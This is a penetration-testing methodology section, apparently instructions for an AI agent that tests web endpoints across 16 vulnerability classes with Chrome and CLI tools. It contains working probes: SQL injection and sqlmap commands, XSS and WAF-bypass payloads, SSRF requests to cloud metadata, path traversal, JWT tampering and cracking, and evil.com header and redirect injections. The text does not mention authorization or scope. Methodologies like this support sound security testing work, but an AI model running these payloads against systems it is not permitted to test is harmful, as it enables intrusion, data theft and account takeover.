# Phase 2: Attack Vectors

Systematic vulnerability testing procedures for 16 categories. For each endpoint from `recon-results.json`, test every applicable category.

Read `references/chrome-testing.md` for Chrome tool patterns and `references/cli-tools.md` for CLI tool syntax.

## Testing Matrix

Build a matrix of: `endpoint x vulnerability_category`. Track status as: `pending`, `testing`, `not_applicable`, `clean`, `finding`.

## Category Priority Order

Test in this order (highest impact first):

1. SQL Injection
2. XSS (Reflected/Stored/DOM)
3. SSRF
4. IDOR / Broken Access Control
5. Auth/AuthZ Bypass
6. Path Traversal / LFI
7. Information Disclosure
8. JWT Vulnerabilities
9. CORS Misconfiguration
10. CSRF
11. Open Redirect
12. CRLF Injection
13. Host Header Injection
14. Business Logic Flaws
15. Cache Poisoning
16. Race Condition

---

## Category 1: SQL Injection

**Applicable to:** Endpoints with query parameters, form inputs, API parameters, headers (Cookie, Referer, User-Agent).

**Chrome Testing:**
1. Navigate to the endpoint with a parameter
2. Input basic detection payloads into form fields or URL params:
   - `' OR '1'='1` — classic auth bypass
   - `1' AND '1'='2` — boolean-based blind
   - `1; WAITFOR DELAY '0:0:5'--` — time-based blind (MSSQL)
   - `1' AND SLEEP(5)--` — time-based blind (MySQL)
   - `' UNION SELECT NULL,NULL--` — union-based
3. Observe: error messages, response time changes, data differences

**CLI Testing:**
```bash
# Automated scan on URL with parameters
sqlmap -u "https://target.com/page?id=1" --batch --random-agent --level=3 --risk=2 --output-dir=sqlmap-output/

# POST data
sqlmap -u "https://target.com/api" --data="username=admin&password=test" --batch --random-agent

# With cookie from Chrome session
sqlmap -u "https://target.com/api?id=1" --cookie="session=<value>" --batch --random-agent

# Header injection
sqlmap -u "https://target.com/api" --headers="X-Forwarded-For: 1*" --batch --random-agent
```

**Indicators of success:**
- Database error messages (MySQL, PostgreSQL, MSSQL, Oracle, SQLite syntax)
- Response time delay matching SLEEP/WAITFOR value
- Different content returned for true vs false conditions
- UNION SELECT returning additional data rows

**If found:** Record the vulnerable parameter, injection type (error/blind/union), DBMS, and full sqlmap output. GIF record the Chrome-based PoC.

---

## Category 2: XSS (Reflected / Stored / DOM)

**Applicable to:** Search fields, comment forms, profile fields, URL parameters, any user input reflected in HTML.

**Reflected XSS — Chrome Testing:**
1. Navigate with payload in URL parameter:
   - `<script>console.log('XSS-REFLECTED')</script>`
   - `"><img src=x onerror=console.log('XSS-REFLECTED')>`
   - `'><svg/onload=console.log('XSS-REFLECTED')>`
   - `javascript:console.log('XSS-REFLECTED')` (for href attributes)
2. Check console for `XSS-REFLECTED` message
3. Check page source for unescaped payload reflection

**Stored XSS — Chrome Testing:**
1. Submit payload via form (comment, profile, message):
   - `<img src=x onerror=console.log('XSS-STORED')>`
   - `<svg/onload=console.log('XSS-STORED')>`
   - `"><details open ontoggle=console.log('XSS-STORED')>`
2. Navigate away, then return to the page where input is displayed
3. Check console for `XSS-STORED` message

**DOM XSS — Chrome Testing:**
1. Check for dangerous sinks in JS:
   ```
   innerHTML, outerHTML, document.write, eval(), setTimeout(string),
   setInterval(string), location.href assignment, $.html(), v-html
   ```
2. Test DOM sources:
   - `location.hash`: `https://target.com/page#<img src=x onerror=console.log('DOM-XSS')>`
   - `location.search`: `?param=<img src=x onerror=console.log('DOM-XSS')>`
   - `document.referrer`: Navigate from a page with XSS in URL

**CLI Testing:**
```bash
nuclei -u https://target.com -tags xss -o nuclei-xss.txt
```

**WAF Bypass payloads (if basic payloads filtered):**
- `<img src=x onerror=console.log\u0028'XSS'\u0029>`
- `<svg/onload=top['con'+'sole']['lo'+'g']('XSS')>`
- `<details/open/ontoggle=console.log('XSS')>`
- `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=console.log('XSS')>`

---

## Category 3: SSRF

**Applicable to:** URL input fields, image/file fetch features, webhook configurations, PDF generators, import/export features.

**Chrome Testing:**
1. Find input fields that accept URLs
2. Test with internal targets:
   - `http://127.0.0.1`
   - `http://localhost`
   - `http://169.254.169.254/latest/meta-data/` (AWS metadata)
   - `http://metadata.google.internal/` (GCP metadata)
   - `http://[::1]` (IPv6 localhost)
3. Observe if response content changes (indicates server-side fetch)

**CLI Testing:**
```bash
nuclei -u https://target.com -tags ssrf -o nuclei-ssrf.txt
```

**Bypass patterns (if basic URLs filtered):**
- `http://127.1` — shortened localhost
- `http://0x7f000001` — hex IP
- `http://2130706433` — decimal IP
- `http://127.0.0.1.nip.io` — DNS rebinding
- `file:///etc/passwd` — file protocol
- `gopher://127.0.0.1:6379/_` — gopher protocol (Redis)

---

## Category 4: IDOR / Broken Access Control

**Applicable to:** Any endpoint with user-specific IDs (user profiles, orders, documents, API resources).

**Chrome Testing:**
1. Log in as User A, navigate to a resource: `/api/user/123/profile`
2. Note the ID (123)
3. Change ID to another user: `/api/user/124/profile`
4. Compare responses — if User B's data returned, IDOR confirmed
5. Also test:
   - Sequential IDs: 1, 2, 3...
   - UUIDs: try other UUIDs from other endpoints
   - Encoded IDs: Base64 decode, modify, re-encode

**CLI Testing:**
```bash
# Brute-force sequential IDs
ffuf -w <(seq 1 1000) -u "https://target.com/api/user/FUZZ/profile" -H "Cookie: session=<value>" -mc 200 -o idor-results.json -of json
```

**Horizontal vs Vertical:**
- Horizontal: same role, different user's data
- Vertical: lower role accessing admin functions

Test both by:
1. Accessing admin endpoints with regular user session
2. Accessing other users' resources with own session

---

## Category 5: Authentication / Authorization Bypass

**Applicable to:** Login pages, password reset, MFA, admin panels, API authentication.

**Chrome Testing:**
1. **Default credentials:** admin/admin, admin/password, test/test
2. **Password reset flow:** Request reset, check if token is predictable
3. **Direct access:** Navigate to authenticated pages without login
4. **Parameter manipulation:** Change `role=user` to `role=admin` in requests
5. **HTTP method switch:** If POST blocked, try PUT, PATCH, or GET
6. **Path traversal in auth:** `/admin` blocked? Try `/admin/`, `/Admin`, `/ADMIN`, `//admin`

**CLI Testing:**
```bash
# Test accessing authenticated endpoints without auth
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/admin/users

# Method switching
curl -s -X POST https://target.com/admin -o /dev/null -w "%{http_code}"
curl -s -X PUT https://target.com/admin -o /dev/null -w "%{http_code}"
```

---

## Category 6: Path Traversal / LFI

**Applicable to:** File download/view endpoints, template parameters, include parameters.

**Chrome Testing:**
1. Find parameters that reference files: `?file=report.pdf`, `?page=about`, `?template=default`
2. Replace with traversal payloads:
   - `../../../etc/passwd`
   - `....//....//....//etc/passwd`
   - `..%2f..%2f..%2fetc/passwd`
   - `%252e%252e%252f` (double URL encoding)
   - `..\/..\/..\/etc/passwd` (backslash)

**CLI Testing:**
```bash
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "https://target.com/page?file=FUZZ" -mc 200 -fs <baseline> -o lfi-results.json -of json
```

---

## Category 7: Information Disclosure

**Applicable to:** All endpoints. Check error pages, debug modes, exposed files.

**Chrome Testing:**
1. Trigger errors: invalid input, missing params, wrong content-type
2. Check for stack traces, file paths, database names
3. Look for debug endpoints: `/debug`, `/trace`, `/actuator`, `/elmah.axd`
4. Check robots.txt, sitemap.xml for hidden paths

**CLI Testing:**
```bash
nuclei -u https://target.com -tags exposure -o nuclei-exposure.txt

# Check common sensitive files
for path in .env .git/config .svn/entries phpinfo.php server-status .well-known/security.txt robots.txt sitemap.xml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  echo "$path: $code"
done
```

---

## Category 8: JWT Vulnerabilities

**Applicable to:** APIs using JWT authentication (check localStorage, sessionStorage, cookies).

**Chrome Testing:**
1. Extract JWT (see `references/chrome-testing.md` "JWT Analysis")
2. Decode header and payload
3. Check algorithm: if RS256, try changing to HS256 (algorithm confusion)
4. Try `alg: none`: remove signature, set header `{"alg":"none"}`
5. Check expiration: is `exp` enforced?
6. Modify payload claims: change `role`, `sub`, `admin` fields

**CLI Testing:**
```bash
# If jwt_tool is installed
python3 jwt_tool.py <token> -T  # Tamper mode
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt  # Crack secret
```

---

## Category 9: CORS Misconfiguration

**Applicable to:** API endpoints, especially those returning sensitive data.

**Chrome Testing:**
See `references/chrome-testing.md` "CORS Misconfiguration Testing".

**CLI Testing:**
```bash
# Test origin reflection
curl -s -I -H "Origin: https://evil.com" https://target.com/api | grep -i access-control

# Test null origin
curl -s -I -H "Origin: null" https://target.com/api | grep -i access-control

# Test subdomain variation
curl -s -I -H "Origin: https://evil.target.com" https://target.com/api | grep -i access-control
```

**Vulnerable if:**
- `Access-Control-Allow-Origin` reflects the arbitrary origin
- `Access-Control-Allow-Credentials: true` with reflected origin

---

## Category 10: CSRF

**Applicable to:** State-changing actions (profile update, password change, settings, money transfer).

**Chrome Testing:**
1. Check for CSRF tokens in forms (see `references/chrome-testing.md`)
2. Check `SameSite` attribute on session cookies
3. If no token and `SameSite=None` or missing: CSRF likely possible
4. Verify by submitting the form without the token (remove hidden field)

**No CLI tool — manual Chrome testing only.**

---

## Category 11: Open Redirect

**Applicable to:** Login redirects, OAuth callbacks, `?next=`, `?url=`, `?redirect=`, `?return_to=` parameters.

**Chrome Testing:**
Navigate with redirect payload:
- `?redirect=https://evil.com`
- `?redirect=//evil.com`
- `?redirect=/\evil.com`
- `?redirect=https://target.com@evil.com`

Check final `window.location.href` after redirect.

**CLI Testing:**
```bash
nuclei -u https://target.com -tags redirect -o nuclei-redirect.txt
```

---

## Category 12: CRLF Injection

**Applicable to:** URL parameters reflected in response headers.

**CLI Testing:**
```bash
curl -s -I "https://target.com/%0d%0aX-Injected:true" | grep -i "x-injected"
curl -s -I "https://target.com/page?param=value%0d%0aX-Injected:true" | grep -i "x-injected"

nuclei -u https://target.com -tags crlf -o nuclei-crlf.txt
```

---

## Category 13: Host Header Injection

**Applicable to:** Password reset, email verification, any feature that generates URLs based on Host header.

**CLI Testing:**
```bash
# Basic host header injection
curl -s -H "Host: evil.com" https://target.com -o response.txt
grep -i "evil.com" response.txt

# X-Forwarded-Host
curl -s -H "X-Forwarded-Host: evil.com" https://target.com/password-reset -o response.txt
grep -i "evil.com" response.txt
```

---

## Category 14: Business Logic Flaws

**Applicable to:** Multi-step workflows, pricing, coupons, limits, role transitions.

**Chrome Testing (manual only):**
1. **Price manipulation:** Edit price field in DOM before submitting checkout
2. **Coupon stacking:** Apply same coupon twice
3. **Negative quantities:** Set quantity to -1
4. **Step skipping:** Jump from step 1 to step 3 in wizard
5. **Race in business logic:** Add item to cart, apply discount, remove item — does discount persist?
6. **Role escalation:** Change role parameter during registration

No CLI automation — business logic is context-dependent.

---

## Category 15: Cache Poisoning

**Applicable to:** Sites behind CDN/reverse proxy (Cloudflare, Varnish, etc.).

**CLI Testing:**
```bash
# Unkeyed header injection
curl -s -H "X-Forwarded-Host: evil.com" https://target.com -o first.txt
curl -s https://target.com -o second.txt
grep -i "evil.com" second.txt  # If found in cached response, poisoned

# Unkeyed parameter
curl -s "https://target.com/page?utm_content=<script>alert(1)</script>" -o first.txt
curl -s "https://target.com/page" -o second.txt
grep -i "script" second.txt
```

---

## Category 16: Race Condition

**Applicable to:** Coupon redemption, money transfer, vote/like, account creation, file upload.

**CLI Testing:**
```bash
# Send 20 parallel requests
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/redeem-coupon \
    -H "Cookie: session=<value>" \
    -d "coupon=SAVE50" &
done
wait

# Check if coupon applied multiple times
```

**Chrome Testing:**
Cannot easily test race conditions in Chrome. Use CLI exclusively.

---

## Finding Documentation

When a vulnerability is confirmed, record in `findings.json`:

```json
{
  "id": "FINDING-001",
  "category": "SQL Injection",
  "severity": "Critical",
  "cvss": 9.8,
  "endpoint": "https://target.com/api/users?id=1",
  "parameter": "id",
  "description": "Union-based SQL injection in user lookup endpoint",
  "evidence": "poc-sqli-users-2026-04-02.gif",
  "tested_at": "2026-04-02T14:30:00Z"
}
```

Then GIF-record the PoC via Chrome (see `references/chrome-testing.md` "GIF Evidence Recording").
